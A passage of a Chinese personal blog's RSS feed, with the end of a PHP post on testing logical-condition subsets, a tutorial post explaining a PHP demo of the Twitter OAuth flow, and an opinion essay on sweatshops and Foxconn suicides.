&#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[=] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160;[b] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[=] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160;)</p><p> &#160; &#160;[1] =&#62; Array<br /> &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160;[a] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[=] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160;[c] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[=] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160;[e] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[&#62;] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160;)</p><p> &#160; &#160;[2] =&#62; Array<br /> &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160;[a] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[=] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160;[c] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[=] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160;[f] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[=] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160;)</p><p>)</p></blockquote><p>至于判断，应该不算难，按照上面的数组挨个字段判断就可以了。以及判断父集合是否有子集合没有的字段，如果有，那肯定不是子集关系了。</p><p>写完之后一直没把握到底做的对不对，要是有类似 <a href="http://www.webstandards.org/files/acid2/test.html">ACID 2</a> 或者 <a href="http://en.wikipedia.org/wiki/Man_or_boy_test">Man or boy test</a> 那样的东西就好了。如果能有人告诉我有什么复杂条件是我的代码判断不了的，实在感激不尽（当然，用 10MB 长的条件语句搞溢出不算……）</p><p>看了看 <a href="http://home.wangjianshuo.com/cn/20100511_ccceecc.htm">其他人的答案</a>，“从离散数学到编译原理”，这标题总结得不错，核心也就是这两个问题吧。我用正则来把“编译”那部分绕过去了，但从执行效率上讲是很蠢的。</p><p>看来大家都知道画蛇添足的故事，所以都只做了满足要求（“为了简单起见，只需要实现最简单的AND, OR逻辑操作，大于，等于，小于三种比较操作就好”）的最小实现。</p><p>如果能有 PHP 同好的题解能相互学习学习那是最好了，其他语言的看不懂 <span style="white-space: nowrap;">-_-</span></p><p>原来还自诩为程序员，被这道题臊的不行，我现在的定义是，没法独自实现一个 C Compiler 的人充其量也不过是 coding fans。</p><p>给自己定下了三年目标：学离散数学、学微积分、学<a href="http://book.douban.com/subject/1148282/">《SICP》</a></p><p><img src="http://rss.soulogic.com/track/400" /></p>]]></description></item>
<item><title>PHP for Twitter OAuth 教学演示</title><link>https://soulogic.com/archives/399</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>63c36e6a5a6357539377e4cedd2cad06</guid><pubDate>Mon, 03 May 2010 02:52:54 +0800</pubDate><description><![CDATA[<p>说来话长，两三年前只是想搞个 Jabber 的 PHP Class，顺便就用上了 Livid 的 v2ex 的山寨 twitter，他起名叫 doing，我觉得这名字挺好，后来，鸭被墙了，我就琢磨着挪到 twitter 上，而且真倒了一部分数据，但我不用 twitter 的原因不是因为墙，是因为当时老看见鲸鱼，而且由于压力过大，twitter 关掉了一部分外围功能，其中就包括 GTalk 机器人，这搞得我严重不爽，因为我只用 GTalk 发，于是就自己写了一个自娱自乐了。地址是 <a href="http://plan.soulogic.com/">http://plan.soulogic.com/</a>（还有其他原因，如字数限制、以及我喜欢大量摘引一些文字，我希望有更明显的显示上的区分）</p><p>前几天在想，可以考虑做个同步，也不是很费事，一看文档，直接用 cURL 就可以发，但唯独一点不能容忍，就是发完后在 twitter.com 看到的附属信息结尾写的是“via API”，凭什么别人用的都是有名的我的就不行啊！看到 FAQ 才明白需要注册个 app，再通过 OAuth 发，才能显示 via app，于是这一天多的时间就耗在这上了。效果参见 <a href="http://twitter.com/soulogic/status/13261231824">http://twitter.com/soulogic/status/13261231824</a></p><p>其实麻烦就麻烦在搞明白整个过程，实现倒都很简单了，我是参考的 <a href="http://github.com/abraham/twitteroauth">TwitterOAuth</a>，把所有 cURL 过程和生成参数的过程输出到日志文件上，才算通了。</p><p>把这几行代码放上来的原因，就是为了帮别人更容易看明白整个交互过程，不用找一个完整实现再在所有地方下钩子。</p><p>还有个原因是，无论用谁的框架，都需要改一下把走代理加进去的……</p><p>把文档说明也放上来吧</p><p><a href="https://soulogic.com/upload/120">点击这里下载代码 toauth.tar.gz</a></p><blockquote class="code"><p><br />	PHP for Twitter OAuth 教学演示</p><p><br />注意：要求 PHP 版本 5.3 以上</p><p><br />如果你对 OAuth 还一无所知（就和我前天一样），<br />希望这份代码可以帮你更快的理解整个交互过程，而且也只是为了这个<br />如果要找一个完整实现，这个并不合适<br />可以考虑 http://github.com/abraham/twitteroauth 或者 Zend Framework</p><p>----------------------------------------------</p><p>首先确认你已经注册了 Application</p><p>注册地址 http://twitter.com/oauth_clients/new</p><p>你会得到 Consumer key 和 Consumer secret<br />把这两个字符串写到 common.inc.php 相应位置</p><p>顺便你还可以改下 callback 地址<br />这个地址只是引导用户访问，Twitter 并不直接访问你的 Web Server<br />所以在测试阶段直接用内网地址好了，这份代码暴露在公网是很危险的</p><p>对照 oauth.net 上的图<br /><img src="http://oauth.net/core/diagram.png" /><br />过程如下：</p><p>	1. 执行 1_start.php，得到 Request Token（步骤 A、B）<br />	2. 带着 Request Token 访问 twitter.com 上页面，得到用户确认<br />	 &#160; 并带着参数跳转到你指定的 2_callback.php 页面（步骤 B、C、D）<br />	3. 2_callback.php 发起请求，用 Request Token 换得 Access Token<br />	 &#160; （步骤 E、F）<br />	4. 3_work.php 根据 Consumer key/secret 和 Access Token/secret 这四个参数<br />	 &#160; 以用户身份推一条消息（步骤 G）</p><p>整个 OAuth 的过程就是为了得到不同用户所相对应的 Access Token/secret<br />把这两个参数存起来后，就可以用 3_work.php 不断发了</p></blockquote><p><img src="http://rss.soulogic.com/track/399" /></p>]]></description></item>
<item><title>所谓血汗工厂</title><link>https://soulogic.com/archives/398</link><author>zhengkai@gmail.com (郑凯)</author><category>铂 Platinum</category><guid>a1dda951b1c1cbfd74ee382b24b288e9</guid><pubDate>Wed, 21 Apr 2010 22:37:17 +0800</pubDate><description><![CDATA[<p>几个月前看《卧底经济学》，收获颇多，但是其中的很多问题一直在琢磨，还没法全盘接受</p><p>比方说，美国对中国的贸易抵制并不是两国工厂之间的竞争，本质上是美国的优势产业跟美国的夕阳产业之间的竞争，这个我好理解。再比方说血汗工厂，作者的观点是，这是必由之路，是那些工人的后代摆脱贫困的起点，不受苦是无法缩小和其他地区的经济上的差距，其次就是，血汗工厂里装的不是奴隶，他们愿意在血汗工厂干，说明其他的营生可能比去血汗工厂更糟糕，那些抵制血汗工厂产品的行为，最终可能导致工人的生活条件更差。</p><p>我起初不太愿意接受这种可以把血汗工厂描述得完全没有罪恶感的说法，同时也实在不了解那些所谓有血汗工厂的地区到底是什么样的——如果传说中的血汗工厂都是像黑煤窑那样真的在养奴隶呢？</p><p>但起码就最近的富士康来说，那些工人应该也都是自愿报名、经过竞争筛选之后才去的，今天在 cnBeta 上看到篇转载的文章，说的是这个意思</p><blockquote><p>廉价劳动力供给充足就应当被资本盘剥吗？答案显然是否定的。富士康员工向媒体坦言， “我们生产的是全世界最好的产品，但是却拿着差不多最低的待遇。”“如果不加班，每个月的工资都不够花。”然而，这样的评价却没有浇灭后来者的应聘热情。调查显示，其中的原因是“富士康能按时发工资，福利和工厂环境好点”。以此观之，其他的招工企业居然连按时发放工资都无法保障，劳动者权益保障的法律底限未能得到遵守，由此才会使得富士康具备了明显的“比较优势”。</p><p>via <a href="http://www.dfdaily.com/node2/node24/node224/userobject1ai219176.shtml">《东方早报》</a> 马红漫</p></blockquote><p>（另外再补充一点，他们居然有加班费！）</p><p>另外还有一个问题，人类无法理解太大数目的数字，我真的怀疑，很多人把富士康、华为这样有着几万几十万员工的公司，跟自己所见过的几千人的“大厂”来相比较（打个岔，03年在天通苑租房子，我当时没能理解所谓的“天通苑小区”是多大，打车到正门下了，结果去东一区我又在小区里走了三站地——货真价实的三个公交站牌，不是我打比方）。世界平均自杀率是每年每十万人自杀 10 个，中国是高于这个水平的。这意味着，如果所有自杀者全部被报道了，那富士康和华为是非常牛逼的公司，这些年几十万员工才自杀了几十个，远低于中国平均水平，反过来说，实际自杀人数需要达到被报道人数的几倍，才能“追上”中国平均自杀水平。</p><p>不排除有非法限制自由或者别的什么事，真有这些问题是需要政府来执法的。但也可以推倒出来，这么多年了，哪怕第一批进去的是被骗了，但后继者中大部分应该还是对其有所了解的，但他们还是去了。</p><hr /><p>这片被诅咒的土地从来不缺头脑简单的生物，一阵阵的浪潮就像《1984》里的仇恨周一样不可思议，从来没有慈善行为（或者傻逼呵呵的以为给<a href="https://soulogic.com/archives/173">乞丐</a>钱是慈善）的人们在喊着口号进行“运动式捐款”，同时义愤填膺的谈论某公司怎么捐的这么少，或者热衷于研究所谓的血汗工厂又自杀了几个员工。</p><p>比这更有趣的事情，例如我 04 年注意到的一个<a href="https://soulogic.com/archives/185">数字游戏</a>，为什么就没人关心呢？</p><hr /><p><span style="font-weight: bold; font-family: '微软雅黑'">Update in 2010.05.13</span></p><p>《南方周末》上有一篇文章，<a href="http://www.infzm.com/content/44878">http://www.infzm.com/content/44878</a> 可以说符合我的预测</p><p><img src="http://rss.soulogic.com/track/398" /></p>]]></description></item>
</channel>
</rss>